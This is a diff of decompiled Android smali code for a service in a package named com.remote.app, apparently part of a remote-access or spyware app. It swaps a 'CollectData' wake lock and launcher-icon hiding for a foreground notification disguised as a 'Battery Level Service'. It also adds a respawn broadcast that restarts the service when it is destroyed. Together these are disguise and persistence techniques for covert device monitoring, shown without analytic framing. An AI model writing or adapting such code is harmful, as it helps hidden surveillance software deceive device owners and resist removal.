@@ -7,23 +7,11 @@
 .field private static a:Landroid/content/Context;
 
 
-# instance fields
-.field b:Z
-
-.field c:Landroid/os/PowerManager;
-
-.field d:Landroid/os/PowerManager$WakeLock;
-
-
 # direct methods
 .method public constructor <init>()V
-    .locals 1
+    .locals 0
 
     invoke-direct {p0}, Landroid/app/Service;-><init>()V
-
-    const/4 v0, 0x0
-
-    iput-boolean v0, p0, Lcom/remote/app/MainService;->b:Z
 
     return-void
 .end method
@@ -36,88 +24,66 @@
     return-object v0
 .end method
 
+.method private b()V
+    .locals 4
 
-# virtual methods
-.method public b()V
-    .locals 3
+    new-instance v0, Landroid/app/NotificationChannel;
 
-    iget-boolean v0, p0, Lcom/remote/app/MainService;->b:Z
+    const/4 v1, 0x0
 
-    if-eqz v0, :cond_0
+    const-string v2, "example.permanence"
 
-    return-void
+    const-string v3, "Battery Level Service"
 
-    :cond_0
-    const/4 v0, 0x1
+    invoke-direct {v0, v2, v3, v1}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V
 
-    iput-boolean v0, p0, Lcom/remote/app/MainService;->b:Z
+    const v3, -0xffff01
 
-    :try_start_0
-    const-string v0, "power"
+    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->setLightColor(I)V
 
-    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V
+
+    const-string v1, "notification"
+
+    invoke-virtual {p0, v1}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v1
+
+    check-cast v1, Landroid/app/NotificationManager;
+
+    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
+
+    new-instance v0, Landroid/support/v4/app/b$b;
+
+    invoke-direct {v0, p0, v2}, Landroid/support/v4/app/b$b;-><init>(Landroid/content/Context;Ljava/lang/String;)V
+
+    const/4 v1, 0x1
+
+    invoke-virtual {v0, v1}, Landroid/support/v4/app/b$b;->a(Z)Landroid/support/v4/app/b$b;
+
+    const-string v2, "Battery Level"
+
+    invoke-virtual {v0, v2}, Landroid/support/v4/app/b$b;->b(Ljava/lang/CharSequence;)Landroid/support/v4/app/b$b;
+
+    invoke-virtual {v0, v1}, Landroid/support/v4/app/b$b;->a(I)Landroid/support/v4/app/b$b;
+
+    const-string v1, "service"
+
+    invoke-virtual {v0, v1}, Landroid/support/v4/app/b$b;->a(Ljava/lang/String;)Landroid/support/v4/app/b$b;
+
+    invoke-virtual {v0}, Landroid/support/v4/app/b$b;->a()Landroid/app/Notification;
 
     move-result-object v0
 
-    check-cast v0, Landroid/os/PowerManager;
+    const/4 v1, 0x2
 
-    iput-object v0, p0, Lcom/remote/app/MainService;->c:Landroid/os/PowerManager;
+    invoke-virtual {p0, v1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
 
-    iget-object v0, p0, Lcom/remote/app/MainService;->c:Landroid/os/PowerManager;
-
-    invoke-virtual {v0}, Landroid/os/PowerManager;->isScreenOn()Z
-
-    move-result v0
-
-    if-nez v0, :cond_1
-
-    iget-object v0, p0, Lcom/remote/app/MainService;->c:Landroid/os/PowerManager;
-
-    const v1, 0x20000001
-
-    const-string v2, "ProcessManger:CollectData"
-
-    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;
-
-    move-result-object v0
-
-    iput-object v0, p0, Lcom/remote/app/MainService;->d:Landroid/os/PowerManager$WakeLock;
-
-    iget-object v0, p0, Lcom/remote/app/MainService;->d:Landroid/os/PowerManager$WakeLock;
-
-    const-wide/16 v1, 0x12c
-
-    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager$WakeLock;->acquire(J)V
-
-    goto :goto_0
-
-    :cond_1
-    iget-object v0, p0, Lcom/remote/app/MainService;->d:Landroid/os/PowerManager$WakeLock;
-
-    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z
-
-    move-result v0
-
-    if-eqz v0, :cond_2
-
-    iget-object v0, p0, Lcom/remote/app/MainService;->d:Landroid/os/PowerManager$WakeLock;
-
-    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
-    :try_end_0
-    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
-
-    goto :goto_0
-
-    :catch_0
-    move-exception v0
-
-    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
-
-    :cond_2
-    :goto_0
     return-void
 .end method
 
+
+# virtual methods
 .method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
     .locals 0
 
@@ -126,20 +92,50 @@
     return-object p1
 .end method
 
-.method public onDestroy()V
+.method public onCreate()V
     .locals 2
 
-    const/4 v0, 0x0
+    invoke-super {p0}, Landroid/app/Service;->onCreate()V
 
-    iput-boolean v0, p0, Lcom/remote/app/MainService;->b:Z
+    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v1, 0x1a
+
+    if-le v0, v1, :cond_0
+
+    invoke-direct {p0}, Lcom/remote/app/MainService;->b()V
+
+    goto :goto_0
+
+    :cond_0
+    const/4 v0, 0x1
+
+    new-instance v1, Landroid/app/Notification;
+
+    invoke-direct {v1}, Landroid/app/Notification;-><init>()V
+
+    invoke-virtual {p0, v0, v1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
+
+    :goto_0
+    return-void
+.end method
+
+.method public onDestroy()V
+    .locals 2
 
     invoke-super {p0}, Landroid/app/Service;->onDestroy()V
 
     new-instance v0, Landroid/content/Intent;
 
-    const-string v1, "respawnService"
+    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
 
-    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+    const-string v1, "RestartService"
+
+    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;
+
+    const-class v1, Lcom/remote/app/ServiceReciever;
+
+    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
 
     invoke-virtual {p0, v0}, Landroid/app/Service;->sendBroadcast(Landroid/content/Intent;)V
 
@@ -147,25 +143,9 @@
 .end method
 
 .method public onStartCommand(Landroid/content/Intent;II)I
-    .locals 1
+    .locals 0
 
-    invoke-virtual {p0}, Lcom/remote/app/MainService;->b()V
-
-    invoke-virtual {p0}, Landroid/app/Service;->getPackageManager()Landroid/content/pm/PackageManager;
-
-    move-result-object p1
-
-    new-instance p2, Landroid/content/ComponentName;
-
-    const-class p3, Lcom/remote/app/MainActivity;
-
-    invoke-direct {p2, p0, p3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-
-    const/4 p3, 0x1
-
-    const/4 v0, 0x2
-
-    invoke-virtual {p1, p2, v0, p3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
+    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I
 
     new-instance p1, Lcom/remote/app/j;
 
@@ -185,5 +165,7 @@
 
     invoke-static {p0}, Lcom/remote/app/e;->a(Landroid/content/Context;)V
 
-    return p3
+    const/4 p1, 0x1
+
+    return p1
 .end method
